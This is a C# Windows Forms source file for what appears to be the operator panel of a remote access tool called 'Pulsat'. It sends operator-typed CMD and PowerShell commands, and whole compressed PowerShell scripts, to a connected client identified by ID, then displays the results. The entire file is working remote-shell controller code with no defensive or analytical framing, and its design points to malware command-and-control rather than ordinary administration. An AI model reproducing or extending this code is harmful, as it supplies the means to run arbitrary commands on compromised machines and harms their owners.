using server.Classes;
using server.Enums;
using server.Others;
using System;
using System.Drawing;
using System.Windows.Forms;
namespace server.Forms
{
    public partial class frm_cmd : Form
    {
        public int ID;
        public bool PowershellON = false;
        public interface IRemoteShell
        {
            void PrintMessage_cmd(string message);
            void PrintError_cmd(string errorMessage);
        }
        public frm_cmd()
        {

            InitializeComponent();
        }
        private void flatButton1_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog sfg = new SaveFileDialog())
            {
                if (sfg.ShowDialog() == DialogResult.OK)
                {
                }
                System.IO.File.AppendAllText(sfg.FileName, loges_cmd.Text);

                AutoClosingMessageBox.Show("Saved to " + sfg.FileName, "Pulsat", 2000);
            }
        }

        /// Closing CMD AND POWERSHELL PROC THEN CLOSE THE FORM

        private void flatButton2_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(Common.current_id, Helper.Getbytes("cmdstop"), Common.Current_Key);
            if (PowershellON)
            {
                Form1.MainServer.Send(Common.current_id, Helper.Getbytes("stopPS"), Common.Current_Key);
            }

            this.Close();
        }
        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.Handled = true;
                e.SuppressKeyPress = true;
                if (textBox1.Text == "")
                {
                    MessageBox.Show("Pleas entre a command to be sent ! ", "Powershell", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
                else
                {
                    Form1.MainServer.Send(Common.current_id, Helper.Getbytes("PS|" + textBox1.Text), Common.Current_Key);

                    textBox1.Text = "";
                }
            }
        }
        private void cmd_commands_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.Handled = true;
                e.SuppressKeyPress = true;
                if (cmd_commands.Text == "")
                {
                    MessageBox.Show("Pleas entre a command to be sent ! ", "CMD", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
                else
                {
                    Form1.MainServer.Send(Common.current_id, Helper.Getbytes("cmd|" + cmd_commands.Text), Common.Current_Key);

                    cmd_commands.Text = "";


                    if (flatTabControl1.SelectedIndex == 0)
                    {

                    }
                    else
                    {
                        //POWERSHELL
                    }

                }


            }
        }

        public void PrintMessage(string message, WHICHCMD wHICHCMD)
        {
            try
            {
                switch (wHICHCMD)
                {
                    case WHICHCMD.CMD:
                        loges_cmd.Invoke((MethodInvoker)delegate
                        {
                            loges_cmd.SelectionColor = Color.Lime;
                            loges_cmd.AppendText(message);
                            loges_cmd.SelectionStart = loges_cmd.Text.Length;
                            loges_cmd.ScrollToCaret();
                        });
                        break;
                    case WHICHCMD.POWERSHELL:
                        Loges_Powershell.Invoke((MethodInvoker)delegate
                        {
                            Loges_Powershell.SelectionColor = Color.White;
                            Loges_Powershell.AppendText(message);
                            Loges_Powershell.SelectionStart = Loges_Powershell.Text.Length;
                            Loges_Powershell.ScrollToCaret();
                        });
                        break;

                }

            }
            catch (InvalidOperationException)
            {
            }
        }

        public void PrintError(string errorMessage, WHICHCMD wHICHCMD)
        {
            try
            {
                switch (wHICHCMD)
                {
                    case WHICHCMD.CMD:
                        loges_cmd.Invoke((MethodInvoker)delegate
                        {
                            loges_cmd.SelectionColor = Color.Red;
                            loges_cmd.AppendText(errorMessage);
                            loges_cmd.SelectionStart = loges_cmd.Text.Length;
                            loges_cmd.ScrollToCaret();
                        });
                        break;
                    case WHICHCMD.POWERSHELL:
                        Loges_Powershell.Invoke((MethodInvoker)delegate
                        {
                            Loges_Powershell.SelectionColor = Color.Red;
                            Loges_Powershell.AppendText(errorMessage);
                            Loges_Powershell.SelectionStart = Loges_Powershell.Text.Length;
                            Loges_Powershell.ScrollToCaret();
                        });
                        break;
                }
            }
            catch (InvalidOperationException)
            {
            }
        }
        #region OutputPrinting

        #endregion

        #region Useless


        private void frm_cmd_Load(object sender, EventArgs e)
        {

        }

        private void loges_cmd_TextChanged(object sender, EventArgs e)
        {

        }

        private void cmd_commands_TextChanged(object sender, EventArgs e)
        {

        }

        private void flatToggle1_CheckedChanged(object sender)
        {
            TopMost = flatToggle1.Checked;
        }

        private void toolTip1_Popup(object sender, PopupEventArgs e)
        {

        }
        #endregion

        private void flatTabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (!PowershellON)
                if (flatTabControl1.SelectedIndex == 1)
                {
                    Form1.MainServer.Send(ID, Helper.Getbytes(Commands.Powershell_start), Common.Current_Key);
                    PowershellON = true;
                }
        }

        private void ResRefresh_Tick(object sender, EventArgs e)
        {
            Form1.MainServer.Send(ID, Helper.Getbytes("CMD_RES"), Common.Current_Key);
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void flatButton3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    string Script = System.IO.File.ReadAllText(ofd.FileName);
                    Script = Helper.CompressString(Script);
                    Form1.MainServer.Send(ID, Helper.Getbytes("PS|_Script|" + Script), Common.Current_Key);

                }
            }
        }
    }
}
